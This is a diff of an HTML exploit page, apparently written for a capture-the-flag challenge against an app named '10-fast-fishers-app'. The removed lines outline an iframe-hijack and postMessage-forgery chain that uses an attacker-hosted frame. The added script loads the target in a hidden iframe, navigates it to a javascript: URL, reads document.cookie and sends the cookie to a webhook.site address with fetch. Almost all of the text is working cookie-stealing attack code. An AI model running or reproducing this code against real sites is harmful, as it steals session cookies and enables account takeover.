@@ -5,46 +5,43 @@
 <script>
 console.log("PWN-START");
 
-// Exploit chain:
-// 1) Open the target app in T2.
-// 2) Repoint T2 iframe[0] to our attacker frame (WindowProxy remains same).
-// 3) Attacker frame postMessage() to parent with forged FISH_CLICKED.
-// 4) Bypass inserthtml guard via trailing space: "insertHTML ".
-// 5) Execute onerror JS in parent origin and exfiltrate document.cookie.
+// Strategy:
+// 1) Use a hidden iframe we control in OUR page.
+// 2) Load the target app into that iframe.
+// 3) After it has loaded, navigate the iframe itself to a javascript: URL.
+//    That javascript runs in the iframe's own origin (10-fast-fishers-app).
+// 4) Exfiltrate document.cookie directly.
 
 const target = "http://10-fast-fishers-app:5000/";
-const framePayload = "https://egraomire2.github.io/CTF-attacker-serv/frame_payload.html";
+const iframe = document.createElement("iframe");
+iframe.style.display = "none";
+iframe.src = target;
+document.body.appendChild(iframe);
+console.log("IFRAME-APPENDED-" + target);
 
-const w = window.open(target, "_blank");
-console.log("POPUP-OPENED-" + target);
+const js = "javascript:(function(){" +
+  "try{" +
+    "const c=document.cookie;" +
+    "console.log('COOKIE-VALUE:'+c);" +
+    "if(c&&c.length>0){fetch('https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad?stolen='+encodeURIComponent(c)).catch(()=>{});} " +
+  "}catch(e){console.log('COOKIE-ERR:'+e.message);} " +
+"})()";
 
 let tries = 0;
-const navLoop = setInterval(() => {
+const leakLoop = setInterval(() => {
   tries++;
   try {
-    if (!w || w.closed) {
-      clearInterval(navLoop);
-      console.log("POPUP-CLOSED");
-      return;
-    }
-
-    // This is the key primitive: cross-origin write to iframe location.
-    w.frames[0].location = framePayload;
-    console.log("IFRAME-NAV-OK-" + tries);
-
-    // Keep trying a bit to win races with app's own activity.
-    if (tries >= 8) {
-      clearInterval(navLoop);
-      console.log("PWN-DONE");
-    }
+    iframe.src = js;
+    console.log("IFRAME-JS-ATTEMPT-" + tries);
   } catch (e) {
-    console.log("IFRAME-NAV-ERR-" + tries + ":" + e.message);
-    if (tries >= 20) {
-      clearInterval(navLoop);
-      console.log("PWN-ABORT");
-    }
+    console.log("IFRAME-JS-ERR-" + tries + ":" + e.message);
   }
-}, 180);
+
+  if (tries >= 15) {
+    clearInterval(leakLoop);
+    console.log("PWN-DONE");
+  }
+}, 2500);
 
 </script>
 </body>
